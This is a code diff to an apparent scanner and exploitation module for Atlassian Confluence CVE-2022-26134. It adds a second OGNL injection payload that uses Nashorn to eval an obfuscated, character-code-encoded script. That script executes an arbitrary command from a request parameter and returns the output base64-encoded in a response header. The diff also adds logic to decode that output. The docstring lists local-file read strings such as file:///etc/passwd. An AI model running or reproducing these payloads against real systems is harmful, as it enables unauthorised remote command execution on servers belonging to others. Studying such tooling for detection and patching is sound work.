@@ -17,13 +17,15 @@
 
         4. Confluence远程代码执行
             CVE-2022-26134
-                Payload: https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134
+                Payload-1: https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134
+                Payload-2: https://github.com/SNCKER/CVE-2022-26134
 
 file:///etc/passwd
 file:///C:\Windows\System32\drivers\etc\hosts
 file:///C:/Windows/System32/drivers/etc/hosts
 '''
 
+import base64
 from lib.api.dns import dns
 from lib.initial.config import config
 from lib.tool.md5 import md5, random_md5
@@ -135,6 +137,11 @@ class AtlassianConfluence():
                 'path': '%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'.format(self.md),
                 'data': '',
                 'headers': head.merge(self.headers, {})
+            },
+            {
+                'path': '%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Confluence%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28118%2C97%2C114%2C32%2C114%2C101%2C113%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C99%2C111%2C109%2C46%2C111%2C112%2C101%2C110%2C115%2C121%2C109%2C112%2C104%2C111%2C110%2C121%2C46%2C119%2C101%2C98%2C119%2C111%2C114%2C107%2C46%2C83%2C101%2C114%2C118%2C108%2C101%2C116%2C65%2C99%2C116%2C105%2C111%2C110%2C67%2C111%2C110%2C116%2C101%2C120%2C116%2C46%2C103%2C101%2C116%2C82%2C101%2C113%2C117%2C101%2C115%2C116%2C40%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C99%2C109%2C100%2C61%2C114%2C101%2C113%2C46%2C103%2C101%2C116%2C80%2C97%2C114%2C97%2C109%2C101%2C116%2C101%2C114%2C40%2C34%2C115%2C101%2C97%2C114%2C99%2C104%2C34%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C114%2C117%2C110%2C116%2C105%2C109%2C101%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C108%2C97%2C110%2C103%2C46%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C103%2C101%2C116%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C40%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C101%2C110%2C99%2C111%2C100%2C101%2C114%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C117%2C116%2C105%2C108%2C46%2C66%2C97%2C115%2C101%2C54%2C52%2C46%2C103%2C101%2C116%2C69%2C110%2C99%2C111%2C100%2C101%2C114%2C40%2C41%2C59%2C13%2C10%2C101%2C110%2C99%2C111%2C100%2C101%2C114%2C46%2C101%2C110%2C99%2C111%2C100%2C101%2C84%2C111%2C83%2C116%2C114%2C105%2C110%2C103%2C40%2C110%2C101%2C119%2C32%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C117%2C116%2C105%2C108%2C46%2C83%2C99%2C97%2C110%2C110%2C101%2C114%2C40%2C114%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C101%2C120%2C101%2C99%2C40%2C99%2C109%2C100%2C41%2C46%2C103%2C101%2C116%2C73%2C110%2C112%2C117%2C116%2C83%2C116%2C114%2C101%2C97%2C109%2C40%2C41%2C41%2C46%2C117%2C115%2C101%2C68%2C101%2C108%2C105%2C109%2C105%2C116%2C101%2C114%2C40%2C34%2C92%2C92%2C65%2C34%2C41%2C46%2C110%2C101%2C120%2C116%2C40%2C41%2C46%2C103%2C101%2C116%2C66%2C121%2C116%2C101%2C115%2C40%2C41%2C41%29%29%22%29%29%7D/?search='+ self.cmd,
+                'data': '',
+                'headers': head.merge(self.headers, {})
             }
         ]
 
@@ -191,12 +198,7 @@ class AtlassianConfluence():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path,
-                        'Data': data,
-                        'Headers': headers
-                    }
+                    'Payload': res
                 }
                 return results
 
@@ -251,12 +253,7 @@ class AtlassianConfluence():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path,
-                        'Data': data,
-                        'Headers': headers
-                    }
+                    'Payload': res
                 }
                 return results
 
@@ -313,10 +310,7 @@ class AtlassianConfluence():
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path
-                    }
+                    'Payload': res
                 }
                 return results
 
@@ -363,15 +357,24 @@ class AtlassianConfluence():
                 return None
 
             res_md = "'X-Cmd-Response': '" + self.md
-            if (res_md in check.check_res(str(res.headers), res_md)):
+            res_md_2 = "'X-Confluence: '" + self.md
+
+            if (self.md in check.check_res(res.headers.get('X-Cmd-Response', ''), self.md)):
                 results = {
                     'Target': target,
                     'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                     'Method': vul_info['vul_method'],
-                    'Payload': {
-                        'Url': url,
-                        'Path': path
-                    }
+                    'Payload': res
+                }
+                return results
+            elif (self.md in check.check_res(base64.b64decode(res.headers.get('X-Confluence', '')).decode(), self.md)):
+                results = {
+                    'Target': target,
+                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                    'Method': vul_info['vul_method'],
+                    'Response-Headers': 'X-Confluence: XXX',
+                    'Response-Decode': 'Base64',
+                    'Payload': res
                 }
                 return results
 
